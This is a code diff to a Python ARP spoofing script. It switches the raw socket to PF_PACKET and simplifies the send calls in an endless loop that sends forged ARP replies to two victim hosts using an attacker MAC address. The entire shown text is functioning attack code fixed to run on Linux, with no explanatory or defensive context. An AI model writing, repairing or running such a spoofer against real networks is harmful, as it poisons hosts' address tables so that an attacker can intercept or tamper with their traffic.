@@ -10,7 +10,7 @@ import socket
 
 # The first parameter determines the packet interface. Use PF_PACKET for Linux and AF_INET for Windows
 # The third parameter determines the protocol we want to use. 0x0800 is IP
-s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.htons(0x0800))
+s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
 
 # Get desired interface from the user
 intf = input("Enter the desired interface: ")
@@ -56,6 +56,6 @@ victim2_ARP = ethernet2 + htype + prototype + hsize + psize + opcode + attackmac
 
 # Continuously send the forged ARP packets to the two targets
 while 1:
-    s.sendto(victim1_ARP, (intf, socket.htons(0x0800)))
-    s.sendto(victim2_ARP, (intf, socket.htons(0x0800)))
+    s.send(victim1_ARP)
+    s.send(victim2_ARP)
 
